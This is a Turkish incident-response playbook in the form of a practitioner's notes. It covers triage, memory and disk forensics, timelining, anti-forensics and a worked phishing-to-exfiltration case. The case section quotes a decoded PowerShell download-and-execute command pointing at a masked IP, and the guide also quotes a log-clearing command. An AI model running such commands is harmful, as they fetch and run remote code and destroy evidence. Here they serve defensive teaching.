# Olay Müdahale (IR) Yaşam Döngüsü Playbook — Pratisyen Notları

> Bu metin, 15+ yıl sahada olay müdahale (IR) yürütmüş bir DFIR lead'inin çalışma defterinden. Amaç, "teoride NIST/SANS döngüsü şudur" demek değil; alarm düştükten sonra **gerçekte hangi tuşa hangi sırayla bastığımı**, hangi artefaktı görünce nereye gittiğimi, nerede durup düşündüğümü aktarmak. Kitaplarda yazmayan yargı kısmı burada.

---

## 1. Bu iş akışı neyi hedefler, IR sürecindeki yeri

Olay müdahalenin tek bir amacı var: **kanamayı durdurmak, sonra ne olduğunu kanıtlarıyla anlatabilmek.** Bu iki hedef sürekli birbiriyle çatışır. Kanamayı hemen durdurmak istersen makineyi kapatırsın, RAM'i ve dolayısıyla saldırganın tüm çalışan araçlarını kaybedersin. Delili korumak istersen makineyi izlersin, bu sırada saldırgan yanal hareketle üç sunucu daha ele geçirir. İşin ustalığı bu iki dürtü arasında **an be an** doğru yeri seçebilmektir.

Klasik döngü altı fazdır ve ben bunları sırayla değil, **iç içe geçmiş** yürütürüm:

1. **Hazırlık (Preparation)** — olaydan önce yapılan her şey. EDR ayakta mı, loglar merkezde mi, KAPE hedef diskleri hazır mı, çağrı listesi güncel mi.
2. **Tespit ve Analiz (Detection & Analysis)** — "gerçekten olay mı, false positive mi?" Triyaj burada.
3. **Sınırlandırma (Containment)** — yayılmayı durdur. Kısa vadeli (network izolasyonu) ve uzun vadeli (segmentasyon, kimlik sıfırlama) diye ikiye ayrılır.
4. **Kök Sökme (Eradication)** — kalıcılık mekanizmalarını, backdoor'ları, ele geçmiş hesapları temizle.
5. **Kurtarma (Recovery)** — sistemleri kontrollü şekilde üretime geri al, gözetim altında.
6. **Çıkarılan Dersler (Lessons Learned)** — post-mortem, tespit boşluklarını kapat.

Pratikte fazlar temiz sırayla akmaz. Sınırlandırma yaparken yeni bir ele geçmiş makine tespit edersin, tekrar analize dönersin. Bu döngüsel doğa normaldir. **Acemi lineer ilerlemeye çalışır, usta paralel yürütür.** DFIR'ın kalbi 2. ve 3. fazdadır — asıl değer, elindeki belirsiz sinyalden doğru sonuca hızlı ve savunulabilir şekilde gitmektir.

Bir şeyi baştan söyleyeyim: **her alarm olay değildir.** İşin %70'i "bu gerçekten bir şey mi?" sorusuna dürüst cevap vermektir. Olayı gereğinden büyük ilan edersen kurumu gereksiz panik ve maliyete sokarsın; küçük görürsen fidye yazılımı Pazartesi sabahı tüm domaini şifreler.

---

## 2. Adım adım İŞ AKIŞI ve KARAR (asıl değer)

Aşağıda tipik bir "uç noktada şüpheli aktivite" alarmından tam soruşturmaya kadar izlediğim akışı, karar noktalarıyla veriyorum.

### 2.0 Alarm düştü — ilk 5 dakika (triyaj)

İlk yaptığım şey **koşmak değil, çerçeve kurmaktır.** Üç soruyu netleştiririm:

- **Kapsam belirsizliği:** Kaç makine? Bir uç nokta mı, sunucu filosu mu? Kimlik (Active Directory) etkilenmiş görünüyor mu?
- **Zaman:** Alarm ne zaman düştü, ilk aktivite ne zaman? "Dwell time" (saldırganın içeride kaldığı süre) saat mi, ay mı?
- **Canlı mı?** Saldırgan şu anda klavyede mi (hands-on-keyboard), yoksa geçmiş bir iz mi?

Bu üç cevaba göre **canlı yanıt (live response)** mı yoksa **ölü kutu adli analizi (dead-box forensics)** mi yapacağıma karar veririm. Fidye yazılımı aktif şifreliyorsa dakikalar önemlidir; aylar önce bırakılmış bir webshell'de acele etmenin anlamı yok, delili düzgün toplarım.

### 2.1 Uçtan hızlı görünürlük — EDR ve canlı triyaj

Modern IR'da ilk durağım **EDR** konsoludur (kurumda ne varsa: Defender for Endpoint, CrowdStrike, SentinelOne). EDR'de baktığım ilk şeyler:

- **Süreç ağacı (process tree):** Şüpheli sürecin ebeveyni kim? `winword.exe → cmd.exe → powershell.exe` zinciri gördüysem bu neredeyse kesin bir makro/phishing kaynaklı çalıştırmadır. Meşru bir Office süreci `powershell.exe` doğurmaz.
- **Komut satırı argümanları:** `powershell -nop -w hidden -enc <base64>` — encoded, gizli pencere, profil atlama. Bu bir kırmızı bayrak koleksiyonudur.
- **Ağ bağlantıları:** Süreç dışarıya nereye konuşuyor? Bilinmeyen bir IP'ye 443, ama TLS değil? Beacon paterni (düzenli aralıklı, sabit boyutlu paketler) var mı?

Eğer canlı yanıt gerekiyorsa ve EDR yeterli değilse, uca **Velociraptor** ile bağlanırım. Velociraptor'un artofjuke değeri filodaki **yüzlerce makinede aynı anda hunt** çalıştırabilmektir. Örneğin "şu hash'e sahip dosya hangi makinelerde var?" veya "şu registry Run anahtarı hangi uçlarda dolu?" sorusunu tek VQL sorgusuyla tüm filoya sorarım. Bu, kapsam belirlemenin en hızlı yoludur.

**Karar mantığı:** EDR'de tek bir makinede şüpheli süreç görüyorum ama Velociraptor hunt'ı aynı kalıcılığı beş makinede daha buluyorsa → bu izole bir olay değil, **kampanya**. Olayın severity'sini yükseltir, sınırlandırmayı filo çapında planlarım.

### 2.2 Order of Volatility — ne önce toplanır

Eğer makineyi adli olarak toplayacaksam, **uçuculuk sırasına (order of volatility)** uyarım. En uçucudan en kalıcıya:

1. CPU register/cache (pratikte erişilmez, atla)
2. **RAM (bellek dökümü)** — en değerli uçucu delil
3. Ağ durumu, çalışan süreçler, açık portlar, oturumlar
4. Disk (dosya sistemi, kayıtlar)
5. Uzak loglar, arşivler
6. Fiziksel yedekler

**Pratik kural: fişi çekme.** Makineyi kapatırsan RAM'i kaybedersin ve RAM'de saldırganın şifresiz enjekte kodu, decrypt edilmiş payload'ları, ağ bağlantıları, hatta clear-text kimlik bilgileri olabilir. Fileless (dosyasız) saldırıların çoğu **sadece bellekte** yaşar; diski toplarsan hiçbir şey bulamazsın.

RAM dökümü için WinPMEM (Velociraptor içinde de var) veya Magnet RAM Capture kullanırım. Döküm alındıktan sonra **Volatility 3** ile analiz:

- `windows.pstree` — süreç ağacını çıkar, EDR'de gördüğüm şüpheli zinciri bellekte doğrula.
- `windows.malfind` — enjekte edilmiş, izin bayrağı `PAGE_EXECUTE_READWRITE` olan bellek bölgelerini bul. Klasik process injection burada yakalanır.
- `windows.netscan` — bellekteki ağ bağlantılarını çıkar, C2 IP'sini teyit et.
- `windows.cmdline` — süreçlerin tam komut satırlarını al (disk loglarında olmayabilir).

**"Şu artefaktı görünce şu sonuca giderim":** `malfind` bana `explorer.exe` içinde RWX bir bölge ve içinde `MZ` header gösterdiyse → meşru bir süreç içine **kod enjeksiyonu** yapılmış, muhtemelen process hollowing veya reflective DLL loading. Artık "temiz explorer" varsayımım çöktü, o makineyi ele geçmiş kabul ederim.

### 2.3 Disk — hızlı triyaj toplaması (KAPE)

Tüm diski (bit-bit imaj) almak saatler sürer ve çoğu olayda gereksizdir. Ben önce **KAPE** ile hedefli (targeted) toplama yaparım. KAPE'nin değeri, adli açıdan zengin ama küçük artefaktları dakikalar içinde toplamasıdır:

- **$MFT** (Master File Table) — dosya sistemindeki her dosyanın metadata'sı, silinmiş olanlar dahil.
- **Windows Event Logs** (`.evtx`)
- **Registry hives** (SYSTEM, SOFTWARE, SAM, NTUSER.DAT, UsrClass.dat)
- **Prefetch** (`C:\Windows\Prefetch\*.pf`)
- **Amcache / ShimCache**
- **SRUM** (System Resource Usage Monitor) — hangi süreç ne kadar veri gönderdi (exfiltrasyon için altın)
- Tarayıcı geçmişi, LNK dosyaları, Jump Lists

KAPE `!SANS_Triage` hedefiyle bunların hepsini birden toplar. Topladıktan sonra KAPE'nin **Module** tarafı, **Eric Zimmerman araçlarını** otomatik çalıştırıp parse eder.

### 2.4 Zaman çizelgesi kurma — Eric Zimmerman araçları

DFIR'ın kalbi **zaman çizelgesidir (timeline).** "Ne oldu?" sorusunun cevabı, olayları zaman sırasına dizince ortaya çıkar. Kullandığım araçlar ve ne için:

- **MFTECmd** → `$MFT` parse eder. Dosya oluşturma/değiştirme zamanlarını verir. **Timestomping** (zaman damgası oynaması) tespitinde kritik: `$STANDARD_INFORMATION` ile `$FILE_NAME` zaman damgaları çelişiyorsa → biri manipüle edilmiş.
- **PECmd** → Prefetch parse. Bir çalıştırılabilirin **ilk ve son çalıştırma zamanı** ile **kaç kez çalıştığını** verir. `psexesvc.exe` prefetch'i gördüysem → PsExec ile yanal hareket olmuş.
- **AmcacheParser / AppCompatCacheParser** → çalıştırılan programların kanıtı. Program silinmiş olsa bile Amcache'te izi (SHA1 hash dahil) kalır. "Bu makinede mimikatz çalıştı mı?" sorusunun cevabı burada.
- **RECmd / Registry Explorer** → Kalıcılık avı. `Run`/`RunOnce`, Services, Scheduled Tasks, WMI subscription'ları.
- **LECmd** (LNK), **JLECmd** (Jump Lists) → kullanıcının/saldırganın hangi dosyalara dokunduğu.
- **EvtxECmd** → Event log parse, özellikle 4624/4625 (logon), 4688 (process creation), 4672 (özel yetki), 7045 (yeni servis).

Sonra tüm bu çıktıları **Timesketch** veya **plaso/log2timeline** ile **süper zaman çizelgesinde (super timeline)** birleştiririm. Timesketch'te farklı kaynakları (MFT, event log, prefetch, EDR) tek zaman ekseninde görünce **olayın hikâyesi** ortaya çıkar. Bir olayı işaretler, çevresindeki 30 saniyeye zoom yaparım — genelde "patient zero" o pencerede saklanır.

### 2.5 Kötü amaçlı dosya avı — YARA ve hash

Şüpheli bir binary veya bellek bölgesi bulduğumda:

- **Hash** al (SHA256), threat intel'e (VirusTotal, iç TI platformu) sor. **Ama dikkat:** kurumsal ortamda hash'i doğrudan VT'ye yüklemek yerine önce **hash sorgusu** yaparım — dosyanın kendisini yüklemek, saldırgana "yakalandım" sinyali verebilir ve veri sızıntısı olabilir.
- **YARA** kuralı ile filoyu tara. Bilinen bir aile (örn. Cobalt Strike beacon) için hazır YARA kuralımı Velociraptor üzerinden tüm uçlarda çalıştırır, kaç makinenin enfekte olduğunu tek seferde çıkarırım.
- Statik/dinamik analiz gerekiyorsa **izole (air-gapped) sandbox**'ta çalıştırırım — asla üretim ağında değil.

### 2.6 Sonucu bağlama — kapsamı kapatma

Yeterli veri toplandığında şu üç soruyu cevaplayabilir hâle gelirim ve olayı bu üç eksende raporlarım:

- **Initial access (ilk erişim):** Nasıl girdiler? Phishing eki, açık VPN, sömürülen bir servis?
- **Yanal hareket ve kalıcılık:** Nereye yayıldılar, nasıl kalıcı oldular?
- **Impact (etki):** Ne çaldılar/şifrelediler? SRUM ve firewall loglarıyla exfiltrasyon hacmini ölçerim.

Bu üçü netleşmeden **sınırlandırmayı bitmiş** saymam. Çünkü tek bir kalıcılık mekanizmasını kaçırırsan, temizledikten bir hafta sonra saldırgan geri döner.

---

## 3. Kritik dikkat noktaları

### Delil bütünlüğü (evidence integrity)

Her topladığım imajın **kriptografik hash'ini (SHA256)** toplama anında alırım ve kaydederim. Sonraki her analizde, üzerinde çalıştığım kopyanın hash'i orijinalle eşleşmelidir. **Orijinal delil üzerinde asla doğrudan çalışmam** — read-only bir kopya (working copy) alırım. Fiziksel diski mount ederken **write-blocker** (donanımsal veya yazılımsal) kullanırım ki analiz eylemi bile diski değiştirmesin.

### Order of volatility'e sadakat

Yukarıda anlattım ama tekrar vurguluyorum çünkü en sık ihlal edilen kuraldır: **RAM'i diskten önce al.** Bir makineyi "temizlemek için" yeniden başlatmak, en değerli delili yok etmektir. IT ekibi panikle makineyi kapatmaya meyillidir; benim ilk telefon görüşmem çoğu zaman "hiçbir şeye dokunmayın, kapatmayın, sadece **ağdan izole edin**" olur.

### Chain of custody (delil zinciri)

Bir olayın hukuki/idari sonuç doğurma ihtimali her zaman vardır (dava, sigorta, düzenleyici bildirim). Bu yüzden her delil için **kim, ne zaman, nereden, nasıl topladı ve kime devretti** kaydını tutarım. Delilin fiziksel/mantıksal el değiştirmesinin her adımı belgelenir. Bu zincir kırılırsa delil mahkemede çürütülebilir. Pratikte: imzalı bir custody formu, zaman damgalı toplama logları, ve deliller kilitli/erişimi kısıtlı bir depoda.

### Anti-forensics'e karşı

Yetkin saldırgan izini siler. Beklediğim ve karşı geldiğim teknikler:

- **Log temizleme:** Event log 1102 (audit log cleared) veya 104. Saldırgan `wevtutil cl` çalıştırmış olabilir. **Karşı hamle:** Loglar zaten **merkezî SIEM'e** akıyorsa (hazırlık fazının meyvesi), yerelde silinse de merkezde durur. Yerelde log boşluğu görmek başlı başına bir IOC'dir — "burada bir şey silindi" der.
- **Timestomping:** Dosya zaman damgaları değiştirilmiş. **Karşı hamle:** `$MFT`'nin `$FILE_NAME` özniteliğindeki zaman damgaları normal API'lerle kolay değiştirilemez; `$STANDARD_INFORMATION` ile karşılaştırınca oynama ortaya çıkar. Ayrıca saniye altı (sub-second) hassasiyeti "0000000" olan zaman damgaları manuel setlemenin klasik izidir.
- **Secure delete / dosya silme:** Silinen dosyaların MFT kaydı, USN Journal (`$UsnJrnl`), ve carving ile kısmen kurtarılabilir.
- **Fileless / bellekte yaşama:** Diske hiç düşmeyen tehditler. **Karşı hamle:** RAM analizi ve EDR telemetrisi tek görünürlük kaynağıdır — bu yüzden RAM'i toplamak bu kadar kritiktir.

**Genel felsefe:** Anti-forensics tek bir kaynağı yok edebilir, ama **her şeyi** yok edemez. Bu yüzden ben tek artefakta asla güvenmem; aynı olayı **bağımsız üç kaynakla** (örn. prefetch + amcache + event log) doğrulamaya çalışırım. Saldırgan üçünü birden aynı anda ve tutarlı temizleyemez; tutarsızlık, gerçeğin sızdığı çatlaktır.

---

## 4. Gerçek dünya senaryosu

**Vaka:** Cuma 16:40, muhasebe departmanından bir kullanıcının makinesinde EDR "şüpheli PowerShell" alarmı. Kullanıcı "bir kargo faturası açtım" diyor.

**Adım 1 — Triyaj (ilk 5 dk).** EDR'de süreç ağacına bakıyorum:
`outlook.exe → EXCEL.EXE → cmd.exe → powershell.exe -nop -w hidden -enc SQBFAFgA...`

Excel'in cmd doğurması normal değil. Encoded komutu decode ediyorum: bir `IEX (New-Object Net.WebClient).DownloadString('http://185.x.x.x/a')` — uzak sunucudan indirip çalıştırıyor. **Sonuç: makro içeren bir phishing eki, initial access.** Alarmı gerçek olay olarak sınıflandırıyorum.

**Adım 2 — Canlı görünürlük.** Makine hâlâ açık ve ağda. EDR ağ sekmesinde `185.x.x.x` adresine düzenli, 60 saniyede bir, ~200 byte'lık bağlantılar görüyorum. **Beacon paterni → bu bir C2 kanalı.** Muhtemel bir Cobalt Strike veya benzeri implant.

**Karar:** Fişi çekmiyorum, RAM'i kaybetmek istemiyorum. IT'ye makineyi **ağdan izole et** (EDR'nin network containment özelliği ile — makine sadece EDR ile konuşur, C2 ile konuşamaz) diyorum. Böylece hem kanamayı durdurdum hem RAM canlı.

**Adım 3 — RAM ve disk toplama.** Velociraptor ile bağlanıp WinPMEM ile bellek dökümü, ardından KAPE `!SANS_Triage` ile disk artefaktları. Hash'ler alınıyor, custody formu açılıyor.

**Adım 4 — Bellek analizi.** Volatility 3:
- `windows.malfind` → `powershell.exe` içinde RWX bölge, içinde shellcode. Enjeksiyon doğrulandı.
- `windows.netscan` → `185.x.x.x:443` bağlantısı bellekte teyit.

**Adım 5 — Zaman çizelgesi ve yayılma avı.** Eric Zimmerman araçlarıyla:
- **PECmd** → prefetch'te `psexesvc.exe` var! Saldırgan bu makineden PsExec ile başka makineye atlamış.
- **EvtxECmd** → Security log'da 4648 (explicit credential logon) ve hedef olarak `FIN-SRV01` (finans sunucusu) görünüyor. Saldırgan çalınan kimlikle finans sunucusuna gitmiş.
- **Velociraptor hunt** → aynı C2 IP'sine giden başka makine var mı? Sorgu `FIN-SRV01`'i de döndürüyor. **Kapsam artık iki makine.**

**Adım 6 — Kalıcılık.** RECmd ile registry:
- İlk makinede `HKCU\...\Run` altında bir kayıt.
- `FIN-SRV01`'de bir **Scheduled Task** her açılışta payload'ı çalıştırıyor + bir **yeni servis** (event log 7045).

**Adım 7 — Etki değerlendirmesi.** `FIN-SRV01`'de SRUM analizi (SrumECmd): son 3 saatte dış bir IP'ye ~4 GB veri gönderilmiş. **Muhtemel veri exfiltrasyonu.** Finans verisi olduğu için bu, düzenleyici bildirim (KVKK) tetikleyebilir — hukuk ve yönetim hemen bilgilendirilir.

**Vardığım sonuç:** Phishing → makro → C2 implant → çalınan kimlikle PsExec yanal hareket → finans sunucusunda kalıcılık + ~4 GB exfiltrasyon. İki teyitli ele geçmiş makine, bir olası veri ihlali. Sınırlandırma her iki makineyi de kapsayacak, kök sökme tüm kalıcılık mekanizmalarını (Run key, scheduled task, servis) hedefleyecek, ele geçmiş hesabın parolası **her yerde** sıfırlanacak (saldırgan başka yerde de kullanmış olabilir), ve exfiltrasyon nedeniyle hukuki süreç başlatılacak.

Bu vakada dwell time sadece birkaç saatti — hızlı yakaladık çünkü EDR ve merkezî loglama (hazırlık fazı) yerindeydi. Aynı vaka logsuz bir ortamda haftalar sürer ve exfiltrasyon çoktan tamamlanmış olurdu.

---

## 5. Yaygın tuzaklar ve pro yargısı

**1. Makineyi hemen kapatmak/yeniden başlatmak.** Acemi refleksi "temizleyeyim" diye reboot atmaktır. Bu RAM'i, çalışan C2'yi, bellekteki kimlik bilgilerini yok eder. Pro **izole eder, kapatmaz.**

**2. Tek bir ele geçmiş makineye kilitlenmek.** Acemi "patient zero"yu temizler, olayı kapatır. Pro bilir ki ilk bulunan makine **nadiren** tek makinedir. Her zaman **kapsam sorusunu** (kaç makine, kimlik ele geçti mi) sonuna kadar kovalar. Kimlik (Kerberos ticket, ele geçmiş domain admin) kompromize olduysa, tek tek makine temizlemek anlamsızdır — saldırgan istediği zaman geri gelir.

**3. Kök sökmeden önce kapsamı tamamlamamak.** Acemi ilk backdoor'u görünce hemen siler. Ama saldırganı "uyarmış" olur — o da kalan erişimleriyle daha derine gömülür. Pro **önce tüm dayanak noktalarını haritalar, sonra hepsini aynı anda** (koordineli eradication) söker. Sıralı temizlik, saldırgana kaçış zamanı tanır.

**4. Timestamp'lere körü körüne güvenmek.** Acemi `$STANDARD_INFORMATION` zaman damgasını mutlak gerçek sanır. Pro bunun timestomping ile değiştirilebildiğini bilir; `$FILE_NAME`, USN Journal, prefetch gibi **bağımsız zaman kaynaklarıyla** çapraz doğrular.

**5. Log yokluğunu "temiz" sanmak.** Acemi boş event log görünce "burada bir şey olmamış" der. Pro için **log boşluğunun kendisi bir alarmdır** — 1102 event'i veya beklenen logların eksikliği, aktif bir temizlik operasyonunun kanıtıdır.

**6. IOC odaklı kalıp TTP'yi kaçırmak.** Acemi tek bir hash/IP arar, bulamayınca rahatlar. Ama saldırgan hash'i ve IP'yi her makinede değiştirir. Pro **davranışı** (TTP) avlar: "PowerShell'in encoded komutla ağdan indirmesi" hash'ten bağımsızdır, IP değişse de yakalar. MITRE ATT&CK tekniklerini düşünürüm, tek göstergeleri değil.

**7. Delil zincirini ihmal etmek.** Acemi işin teknik heyecanına kapılıp custody'yi atlar. Sonra olay dava/sigorta konusu olunca deliller kabul edilmez. Pro **her olayı sanki mahkemeye gidecekmiş gibi** belgeler — çünkü hangisinin gideceğini baştan bilemezsin.

**8. Sandbox'ı üretim ağında çalıştırmak.** Acemi şüpheli örneği "ne yapıyor göreyim" diye kurumsal makinede çalıştırır — ve enfeksiyonu yayar. Pro **izole/air-gapped** ortamda analiz eder.

**9. Aşırı toplama ile boğulmak.** Acemi tüm diskin bit-bit imajını alır, günlerce parse eder, ağaçtan ormanı göremez. Pro **hedefli triyaj** (KAPE) ile önce yüksek değerli artefaktları alır, hipotez kurar, sonra gerekirse derinleşir. Hız ve odak, hacimden önemlidir.

**10. "Temizledik" deyip gözetimsiz üretime dönmek.** Acemi recovery'yi "makineyi geri aç" sanır. Pro geri alınan sistemi **artırılmış izleme** altında tutar; saldırganın geri gelme denemesi çoğu zaman kurtarmadan sonraki ilk günlerde olur. Aynı C2'ye, aynı kalıcılık paternine karşı özel alarm kurarım.

---

### Kapanış — pro yargısının özü

İyi bir DFIR analistini araç bilgisi değil, **belirsizlik altında karar verme** yeteneği ayırır. Elimde hiçbir zaman tam veri olmaz; kısmi, çelişkili, kısmen silinmiş izlerden hikâyeyi kurmam gerekir. Bunun için üç ilkeye bağlıyım:

- **Her şeyi çapraz doğrula** — tek artefakt yalan söyleyebilir, üçü birden zor.
- **Kapsamı sonuna kadar kovala** — "bir makine daha var mı?" sorusunu erken bırakma.
- **Hız ile titizlik arasında bilinçli seç** — kanamayı durdur, ama delili öldürme.

Playbook sana adımları verir; hangi adımda ne kadar kalacağına, nerede sapacağına **yargın** karar verir. O yargı da ancak gerçek vakalarla, yanılıp düzelterek gelişir.
